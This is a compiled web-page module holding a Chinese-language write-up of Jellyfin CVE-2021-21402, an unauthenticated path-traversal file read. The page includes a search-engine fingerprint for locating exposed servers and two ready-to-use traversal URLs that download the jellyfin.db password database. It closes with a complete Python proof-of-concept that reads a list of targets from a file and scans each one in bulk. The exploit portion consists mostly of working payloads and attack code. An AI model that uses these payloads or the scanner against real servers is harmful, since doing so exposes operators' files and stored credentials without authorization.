import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as e,o as p,c as o,a as n,b as c,d as l,e as s}from"./app-58e4a7d6.js";const i={},u=s(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Jellyfin是一个免费软件媒体系统。在10.7.1版之前的Jellyfin中，带有某些终结点的精心设计的请求将允许从Jellyfin服务器的文件系统中读取任意文件。当Windows用作主机OS时，此问题更为普遍。暴露于公共Internet的服务器可能会受到威胁。在版本10.7.1中已修复此问题。解决方法是，用户可以通过在文件系统上实施严格的安全权限来限制某些访问，但是建议尽快进行更新。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Jellyfin &lt; 10.7.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&#39;Jellyfin&#39; || body=&#39;http://jellyfin.media&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>无论是<code>/Audio/{Id}/hls/{segmentId}/stream.mp3</code>和<code>/Audio/{Id}/hls/{segmentId}/stream.aac</code>路线允许任意文件在Windows上读取。可以<code>{segmentId}</code>使用Windows路径分隔符<code>\\</code>（对<code>%5C</code>URL进行编码）将路由的一部分设置为相对或绝对路径。最初，攻击者似乎只能读取以<code>.mp3</code>和<code>.aac</code>结尾的文件。但是，通过在URL路径中使用斜杠</p><p>Path.GetExtension(Request.Path)<code>返回一个空扩展名，从而获得对结果文件路径的完全控制。的</code>itemId，因为它没有使用也没有关系。该问题不仅限于Jellyfin文件，因为它允许从文件系统读取任何文件。</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token comment">// Can&#39;t require authentication just yet due to seeing some requests come from Chrome without full query string</span>
<span class="token comment">// [Authenticated] // [1]</span>
<span class="token punctuation">[</span><span class="token class-name">HttpGet</span><span class="token punctuation">(</span><span class="token string">&quot;Audio/{itemId}/hls/{segmentId}/stream.mp3&quot;</span><span class="token punctuation">,</span> <span class="token class-name">Name</span> <span class="token operator">=</span> <span class="token string">&quot;GetHlsAudioSegmentLegacyMp3&quot;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token punctuation">[</span><span class="token class-name">HttpGet</span><span class="token punctuation">(</span><span class="token string">&quot;Audio/{itemId}/hls/{segmentId}/stream.aac&quot;</span><span class="token punctuation">,</span> <span class="token class-name">Name</span> <span class="token operator">=</span> <span class="token string">&quot;GetHlsAudioSegmentLegacyAac&quot;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token comment">//...</span>
<span class="token keyword">public</span> <span class="token class-name">ActionResult</span> <span class="token class-name">GetHlsAudioSegmentLegacy</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token class-name">FromRoute</span><span class="token punctuation">,</span> <span class="token class-name">Required</span><span class="token punctuation">]</span> string itemId<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token class-name">FromRoute</span><span class="token punctuation">,</span> <span class="token class-name">Required</span><span class="token punctuation">]</span> string segmentId<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token comment">// TODO: Deprecate with new iOS app</span>
    <span class="token keyword">var</span> file <span class="token operator">=</span> segmentId <span class="token operator">+</span> <span class="token class-name">Path<span class="token punctuation">.</span>GetExtension</span><span class="token punctuation">(</span><span class="token class-name">Request<span class="token punctuation">.</span>Path</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//[2]</span>
    file <span class="token operator">=</span> <span class="token class-name">Path<span class="token punctuation">.</span>Combine</span><span class="token punctuation">(</span>_serverConfigurationManager<span class="token punctuation">.</span><span class="token function">GetTranscodePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token class-name">FileStreamResponseHelpers<span class="token punctuation">.</span>GetStaticFileResult</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token class-name">MimeTypes<span class="token punctuation">.</span>GetMimeType</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token class-name">HttpContext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用如下请求将会读取带有密码的数据库文件</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>另一处代码如下</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code><span class="token comment">// Can&#39;t require authentication just yet due to seeing some requests come from Chrome without full query string</span>
<span class="token comment">// [Authenticated] //[1]</span>
<span class="token punctuation">[</span><span class="token class-name">HttpGet</span><span class="token punctuation">(</span><span class="token string">&quot;Videos/{itemId}/hls/{playlistId}/{segmentId}.{segmentContainer}&quot;</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
<span class="token comment">//...</span>
<span class="token keyword">public</span> <span class="token class-name">ActionResult</span> <span class="token class-name">GetHlsVideoSegmentLegacy</span><span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token class-name">FromRoute</span><span class="token punctuation">,</span> <span class="token class-name">Required</span><span class="token punctuation">]</span> string itemId<span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token class-name">FromRoute</span><span class="token punctuation">,</span> <span class="token class-name">Required</span><span class="token punctuation">]</span> string playlistId<span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token class-name">FromRoute</span><span class="token punctuation">,</span> <span class="token class-name">Required</span><span class="token punctuation">]</span> string segmentId<span class="token punctuation">,</span>
    <span class="token punctuation">[</span><span class="token class-name">FromRoute</span><span class="token punctuation">,</span> <span class="token class-name">Required</span><span class="token punctuation">]</span> string segmentContainer<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">var</span> file <span class="token operator">=</span> segmentId <span class="token operator">+</span> <span class="token class-name">Path<span class="token punctuation">.</span>GetExtension</span><span class="token punctuation">(</span><span class="token class-name">Request<span class="token punctuation">.</span>Path</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//[2]</span>
    <span class="token keyword">var</span> transcodeFolderPath <span class="token operator">=</span> _serverConfigurationManager<span class="token punctuation">.</span><span class="token function">GetTranscodePath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    file <span class="token operator">=</span> <span class="token class-name">Path<span class="token punctuation">.</span>Combine</span><span class="token punctuation">(</span>transcodeFolderPath<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//[3]</span>

    <span class="token keyword">var</span> normalizedPlaylistId <span class="token operator">=</span> playlistId<span class="token punctuation">;</span>

    <span class="token keyword">var</span> filePaths <span class="token operator">=</span> _fileSystem<span class="token punctuation">.</span><span class="token function">GetFilePaths</span><span class="token punctuation">(</span>transcodeFolderPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// Add . to start of segment container for future use.</span>
    segmentContainer <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">segmentContainer<span class="token punctuation">.</span></span>Insert</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">&quot;.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    string<span class="token operator">?</span> playlistPath <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    foreach <span class="token punctuation">(</span><span class="token keyword">var</span> path in filePaths<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">var</span> pathExtension <span class="token operator">=</span> <span class="token class-name">Path<span class="token punctuation">.</span>GetExtension</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">string<span class="token punctuation">.</span></span>Equals</span><span class="token punctuation">(</span>pathExtension<span class="token punctuation">,</span> segmentContainer<span class="token punctuation">,</span> <span class="token class-name">StringComparison<span class="token punctuation">.</span>OrdinalIgnoreCase</span><span class="token punctuation">)</span>
                <span class="token operator">||</span> <span class="token class-name"><span class="token namespace">string<span class="token punctuation">.</span></span>Equals</span><span class="token punctuation">(</span>pathExtension<span class="token punctuation">,</span> <span class="token string">&quot;.m3u8&quot;</span><span class="token punctuation">,</span> <span class="token class-name">StringComparison<span class="token punctuation">.</span>OrdinalIgnoreCase</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">//[4]</span>
            <span class="token operator">&amp;&amp;</span> <span class="token class-name"><span class="token namespace">path<span class="token punctuation">.</span></span>IndexOf</span><span class="token punctuation">(</span>normalizedPlaylistId<span class="token punctuation">,</span> <span class="token class-name">StringComparison<span class="token punctuation">.</span>OrdinalIgnoreCase</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">//[5]</span>
        <span class="token punctuation">{</span>
            playlistPath <span class="token operator">=</span> path<span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> playlistPath <span class="token operator">==</span> <span class="token keyword">null</span>
        <span class="token operator">?</span> <span class="token class-name">NotFound</span><span class="token punctuation">(</span><span class="token string">&quot;Hls segment not found.&quot;</span><span class="token punctuation">)</span>
        <span class="token operator">:</span> <span class="token class-name">GetFileResult</span><span class="token punctuation">(</span>file<span class="token punctuation">,</span> playlistPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>该<code>/Videos/{Id}/hls/{PlaylistId}/{SegmentId}.{SegmentContainer}</code>路由允许在Windows上读取未经身份验证的任意文件。可以<code>{SegmentId}.{SegmentContainer}</code>使用Windows路径分隔符<code>\\</code>（对<code>%5C</code>URL进行编码）将路由的一部分设置为相对或绝对路径。在<code>SegmentId</code>从和文件扩展名<code>Path</code>被级联。结果<code>file</code>用作<code>Path.Combine</code>[3]的第二个参数。但是，如果第二个参数是绝对路径，则第一个参数to将<code>Path.Combine</code>被忽略，而得到的路径仅是绝对路径<code>file</code>。</p><p>POC如下，下载同样的文件</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>如上为证明漏洞存在和可利用性，详情链接参考</p>`,18),r={href:"https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/",target:"_blank",rel:"noopener noreferrer"},d=s(`<h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> random
<span class="token keyword">import</span> re
<span class="token keyword">from</span> requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> InsecureRequestWarning

<span class="token keyword">def</span> <span class="token function">title</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mVersion: Jellyfin &lt; 10.7.1                                        \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36m使用格式:  python3 poc.py                                            \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36mFile         &gt;&gt;&gt; ip.txt                                             \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">POC_1</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    vuln_url <span class="token operator">=</span> target_url <span class="token operator">+</span> <span class="token string">&quot;/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/&quot;</span>
    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">&quot;User-Agent&quot;</span><span class="token punctuation">:</span> <span class="token string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&quot;</span><span class="token punctuation">,</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span>InsecureRequestWarning<span class="token punctuation">)</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>vuln_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span> <span class="token keyword">and</span> <span class="token string">&quot;file&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text <span class="token keyword">and</span> <span class="token string">&quot;extension&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text <span class="token keyword">and</span> <span class="token string">&quot;font&quot;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[32m[o] 目标 {} 存在漏洞(读取 windows/win.ini), 链接为:{} \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">,</span> vuln_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 目标 {} 不存在漏洞 \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 目标 {} 请求失败 \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>target_url<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">Scan</span><span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_name<span class="token punctuation">,</span> <span class="token string">&quot;r&quot;</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">&#39;utf8&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> scan_url<span class="token punctuation">:</span>
        <span class="token keyword">for</span> url <span class="token keyword">in</span> scan_url<span class="token punctuation">:</span>
            <span class="token keyword">if</span> url<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">&quot;http&quot;</span><span class="token punctuation">:</span>
                url <span class="token operator">=</span> <span class="token string">&quot;http://&quot;</span> <span class="token operator">+</span> url
            url <span class="token operator">=</span> url<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                POC_1<span class="token punctuation">(</span>url<span class="token punctuation">)</span>

            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[31m[x] 请求报错 \\033[0m&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">continue</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    title<span class="token punctuation">(</span><span class="token punctuation">)</span>
    file_name  <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;\\033[35mPlease input Attack File\\nFile &gt;&gt;&gt; \\033[0m&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    Scan<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,2);function k(m,v){const a=e("ExternalLinkIcon");return p(),o("div",null,[u,n("p",null,[n("a",r,[c("https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/"),l(a)])]),d])}const h=t(i,[["render",k],["__file","Jellyfin 任意文件读取漏洞 CVE-2021-21402.html.vue"]]);export{h as default};
